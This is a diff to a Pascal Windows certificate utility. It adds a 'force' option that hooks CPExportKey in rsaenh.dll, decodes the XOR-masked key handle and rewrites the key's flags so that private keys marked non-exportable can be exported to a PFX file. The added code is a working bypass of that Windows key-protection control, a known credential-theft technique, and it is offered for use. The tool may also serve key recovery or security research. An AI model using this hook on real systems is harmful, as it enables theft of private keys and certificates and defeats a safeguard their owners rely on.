@@ -2,14 +2,108 @@ program certfpc;
 
 uses windows,sysutils,registry,classes,
   wcrypt2,schannel,
-  rcmdline in '..\rcmdline-master\rcmdline.pas', cryptutils ;
+  rcmdline in '..\rcmdline-master\rcmdline.pas',
+  cryptutils,
+  ddetours;
 
+{$ifdef CPU64}
+const POINTER_MASK =$E35A172CD96214A0;
+{$endif}
+{$ifdef CPU32}
+const POINTER_MASK =$E35A172C;
+{$endif}
 
+type
+
+UInt32_t = UInt32;
+
+_KEY =record
+    pUnknown:pvoid;
+    dwUnknow:dword;
+    dwFlags:dword;
+end;
+_pkey=^_key;
+_ppkey=^_pkey;
+
+key_data_s=record
+ unknown:pvoid;  //xor'ed
+ alg:uint32_t;
+ flags:uint32_t;
+ key_size:uint32_t;
+ key_bytes:pvoid;
+end;
+ pkey_data_s=^key_data_s;
+
+ magic_s=record
+ key_data:pkey_data_s;
+end;
+ pmagic_s=^magic_s;
+
+HCRYPTKEY_=record
+
+ CPGenKey:pointer;       //4
+ CPDeriveKey:pointer;    //8
+ CPDestroyKey:pointer;   //12
+ CPSetKeyParam:pointer;  //16
+ CPGetKeyParam:pointer;  //20
+ CPExportKey:pointer;    //24
+ CPImportKey:pointer;    //28
+ CPEncrypt:pointer;      //32
+ CPDecrypt:pointer;      //36
+ CPDuplicateKey:pointer; //40
+ hCryptProv_:HCRYPTPROV;  //44
+ magic:pmagic_s; //is XOR-ed with a constant value, 0xE35A172C.
+end;
+PHCRYPTKEY_=^HCRYPTKEY_;
 
 
   //
 var
   cmd: TCommandLineReader;
+
+  nCPExportKey:function(
+    hProv:HCRYPTPROV;hKey:HCRYPTKEY;hExpKey:HCRYPTKEY;dwBlobType:DWORD;
+    dwFlags:DWORD;pbData:PBYTE;pdwDataLen:PDWORD):boolean; stdcall=nil;
+
+
+  {
+  Const SIMPLEBLOB                = 1
+  Const PUBLICKEYBLOB             = 6
+  Const PRIVATEKEYBLOB            = 7
+  Const PLAINTEXTKEYBLOB          = 8
+  }
+  //see https://github.com/iSECPartners/jailbreak
+  function MyCPExportKey(
+    hProv:HCRYPTPROV;hKey:HCRYPTKEY;hExpKey:HCRYPTKEY;dwBlobType:DWORD;
+    dwFlags:DWORD;pbData:PBYTE;pdwDataLen:PDWORD):boolean; stdcall;
+  var
+    magic:nativeuint;
+    key_data_s:nativeuint;
+    p:pointer=nil;
+    d:dword=1234;
+    ppKey:_ppkey = nil;
+    dwFlags_:dword=0;
+  begin
+    p:=@d;
+    //will display the address of the iptrValue variable,
+    //then the address stored in that variable,
+    //and then the value stored at that address
+    //0148F9A4 -> 0148F9A0 -> 1234
+    //writeln(Format('%p -> %p -> %d', [@p, p, dword(p^)]));
+    //writeln(inttohex(nativeuint(pointer(p)),8)); //address stored in p aka 0148F9A0
+    //writeln(inttohex(nativeuint(pointer(@p)),8)); //address of p aka 0148F9A4
+    //writeln('MyCPExportKey');
+    //writeln('dwBlobType:'+inttostr(dwBlobType));
+    //
+    ppKey := _ppkey(hKey xor POINTER_MASK );
+    dwFlags_:= ppkey^.dwFlags ;
+    //writeln('dwFlags_:'+inttostr(dwFlags_));
+    ppkey^.dwFlags:=$4001;
+    //*(DWORD*)(*(DWORD*)(*(DWORD*)(hKey +0x2C) ^ 0xE35A172C) + 8)
+    //writeln('pointer(hkey):'+inttohex(nativeuint(pointer(@hkey)),8));
+    result:=nCPExportKey(hProv,hKey,hExpKey,dwBlobType,dwFlags,pbData,pdwDataLen);
+    ppkey^.dwFlags:=dwflags;
+  end;
 
 //certutil -v blob.bin
 function SaveBlob(RootKey: HKEY; const Key: string):boolean;
@@ -84,6 +178,7 @@ begin
 
     cmd := TCommandLineReader.create;
     cmd.declareflag ('export','export to a pfx file');
+    cmd.declareFlag ('force','will hook cpexportkey to export non exportable pvk');
     cmd.declareflag ('dumpcert','dump from registry to a cer file');
     //cmd.declareflag ('import','');
     cmd.declareflag ('mkcert','');
@@ -114,12 +209,28 @@ begin
  end;
 
  if (cmd.existsProperty('export')) and (cmd.existsProperty('subject'))
-    then if ExportCert(widestring(cmd.readstring('store')),cmd.readstring('subject'),'')=true
+    then
+    begin
+    if cmd.existsProperty('force') then
+       begin
+       LoadLibrary ('rsaenh.dll'); //or else intercept may/will fail
+       @nCPExportKey    :=ddetours.InterceptCreate(GetProcAddress(GetModuleHandle('rsaenh.dll'), 'CPExportKey') , @myCPExportKey);
+       end;
+       if ExportCert(widestring(cmd.readstring('store')),cmd.readstring('subject'),'')=true
          then writeln('ok') else writeln('nok');
+    end;
 
   if (cmd.existsProperty('export')) and (cmd.existsProperty('hash'))
-    then if ExportCert(widestring(cmd.readstring('store')),'',cmd.readstring('hash'))=true
+    then
+    begin
+       if cmd.existsProperty('force') then
+          begin
+          LoadLibrary ('rsaenh.dll'); //or else intercept may/will fail
+          @nCPExportKey    :=ddetours.InterceptCreate(GetProcAddress(GetModuleHandle('rsaenh.dll'), 'CPExportKey') , @myCPExportKey);
+          end;
+       if ExportCert(widestring(cmd.readstring('store')),'',cmd.readstring('hash'))=true
          then writeln('ok') else writeln('nok');
+    end;
 
   if cmd.existsProperty('enumcerts')
      then EnumCertificates(cmd.readstring('store'));
@@ -137,6 +248,7 @@ begin
            then writeln('ok') else writeln('nok');
    }
 
+     //use cmd.readstring('subject')
      if cmd.existsProperty('mkcert')
        then DoCreateCertificate (cmd.readstring('store'),'_Root Authority','CN=Toto8,E=toto@example.com');
 
